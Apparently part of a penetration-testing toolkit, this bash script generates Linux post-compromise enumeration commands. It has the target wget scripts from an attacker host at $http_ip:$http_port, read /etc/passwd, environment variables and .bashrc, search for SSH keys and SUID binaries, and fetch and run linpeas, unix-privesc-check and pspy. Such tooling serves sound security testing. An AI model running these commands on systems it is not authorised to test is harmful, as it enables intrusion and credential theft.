#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/general.sh

linux_enumeration_auto() {
    echo 'Linux Manual Enumeration'
    echo "wget http://$http_ip:$http_port/linux_auto.sh"
    echo '#!/bin/bash' > linux_auto.sh
    echo 'id' >> linux_auto.sh
    echo 'cat /etc/passwd' >> linux_auto.sh
    echo 'hostname' >> linux_auto.sh
    echo 'cat /etc/issue' >> linux_auto.sh
    echo 'uname -a' >> linux_auto.sh
    echo 'ps aux' >> linux_auto.sh
    echo 'ip a' >> linux_auto.sh
    echo 'routel' >> linux_auto.sh
    echo 'ss -anp' >> linux_auto.sh
    echo 'cat /etc/iptables/rules.v4' >> linux_auto.sh
    echo 'ls -lah /etc/cron*' >> linux_auto.sh
    echo 'crontab -l' >> linux_auto.sh
    echo 'sudo crontab -l' >>  linux_auto.sh
    echo 'dpkg -l' >> linux_auto.sh
    echo 'find / -writable -type d 2>/dev/null' >> linux_auto.sh
    echo 'cat /etc/fstab' >> linux_auto.sh
    echo 'mount' >> linux_auto.sh
    echo 'lsblk' >> linux_auto.sh
    echo 'lsmod' >> linux_auto.sh
    echo '/sbin/modinfo libata' >> linux_auto.sh
    echo 'find / -perm -u=s -type f 2>/dev/null' >> linux_auto.sh
    echo 'Linux Automatic Enumeration' 
    echo 'echo "Look at user trails"' >> linux_auto.sh
    echo 'env' >> linux_auto.sh
    echo 'cat ~/.bashrc' >> linux_auto.sh
    echo 'Linux Automatic Enumeration'
    echo "wget http://$http_ip:$http_port/unix_privesc_check.sh" >> linux_auto.sh
    echo unix_privesc_check standard >> linux_auto.sh
}

download_linpeas() {
    if [ ! -f "linpeas.sh" ]; then
        linpeas_link=$(curl -s https://github.com/peass-ng/PEASS-ng/releases | grep linpeas.sh | grep -oP 'href="\K[^"]+')
        wget https://github.com$linpeas_link
    fi
    echo "wget http://$http_ip:$http_port/linpeas.sh -O linpeas.sh"
}

get_run_linpeas_commands() {
    download_linpeas
    echo 'chmod +x linpeas.sh'
    echo './linpeas.sh'
}

download_unix_privesc_check() {
    cp /usr/share/unix-privesc-check/unix-privesc-check .
    generate_linux_download unix-privesc-check
}

get_ssh_keys_commands() {
    echo 'find / -regex ".*\.ssh.*" 2>/dev/null'
}

get_check_text_files_commands() {
    echo 'find / -type f -name "*.txt" 2>/dev/null'
}

get_find_folders_with_write_permissions_commands() {
    echo 'find . -type d -perm -002 -print 2>/dev/null'
}

get_linux_search_commands() {
    get_ssh_keys_commands
    get_check_text_files_commands
    get_find_folders_with_write_permissions_commands
    echo 'find / -perm -u=s -type f 2>/dev/null'
    echo 'find / -user $(whoami) 2>/dev/null | grep -v "^/proc" | grep -v "^/run"'
}

download_pspy() {
    local pspy_file=""
    if [[ -z $pspy_arch ]]; then
        pspy_file="pspy64"
    elif [[ $pspy_arch == "x86" ]]; then
        pspy_file="pspy32"
    else
        pspy_file="pspy64"
    fi
    local url="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/$pspy_file"
    if [[ -f "$pspy_file" ]]; then
        echo "$pspy_file already exists, skipping download."
    else
        wget "$url" -O "$pspy_file"
    fi
    generate_linux_download "$pspy_file"
}
